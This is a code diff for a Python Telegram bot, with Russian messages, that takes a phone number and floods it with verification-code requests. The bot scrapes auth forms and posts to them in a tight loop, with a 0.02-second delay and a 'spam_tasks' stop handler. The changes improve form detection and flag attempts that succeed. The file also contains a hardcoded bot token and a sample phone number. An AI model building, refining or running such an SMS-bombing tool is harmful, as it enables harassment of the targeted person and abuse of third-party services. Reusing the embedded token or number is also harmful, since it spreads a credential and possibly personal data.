@@ -10,7 +10,7 @@ BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
 spam_tasks = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Отправь номер (например, +380963836766) — бот найдёт форму и отправит запрос.")
+    await update.message.reply_text("Отправь номер (например, +380963836766) — бот сам найдёт форму и отправит запрос.")
 
 async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -52,10 +52,9 @@ async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 try:
                     async with session.get(base_url, params=params) as resp:
                         html = await resp.text()
+                    action = "/auth/send"
                     form_match = re.search(r'<form[^>]*action="([^"]*)"[^>]*>', html, re.IGNORECASE)
-                    if not form_match:
-                        action = "/auth/send"
-                    else:
+                    if form_match:
                         action = form_match.group(1)
                         if not action.startswith('http'):
                             action = urljoin(base_url, action)
@@ -70,7 +69,10 @@ async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         status = resp2.status
                         text2 = await resp2.text()
                         count += 1
-                        await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text2[:40]}")
+                        if status == 200 and ("success" in text2.lower() or "code" in text2.lower() or "sent" in text2.lower()):
+                            await context.bot.send_message(chat_id, f"✅ Уведомление отправлено! Попытка #{count}")
+                        else:
+                            await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text2[:40]}")
                 except Exception as e:
                     await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
                 await asyncio.sleep(0.02)
